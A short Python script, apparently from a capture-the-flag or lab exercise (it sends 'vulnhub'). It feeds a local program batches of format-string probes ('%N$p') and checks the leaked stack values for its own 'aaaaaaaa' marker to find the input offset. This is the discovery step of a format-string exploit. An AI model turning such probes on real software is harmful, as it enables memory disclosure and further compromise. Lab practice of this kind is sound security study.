import subprocess

# Start the program as a subprocess
process = subprocess.Popen(['python3', './main.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

commit='vulnhub\n'.encode()
for i in range(50):
    string='aaaaaaaa-%'+str(20*i+1)+'$p-%'+str(20*i+2)+'$p-%'+str(20*i+3)+'$p\n'
    commit+=string.encode()
# Send input to the program and receive its output
output, _ = process.communicate(input=commit)

# Print the output
print(output.decode().replace('aaaaaaaa','\naaaaaaaa'))
if '61616161' in output.decode():
    print('yes')
else:
    print('no')

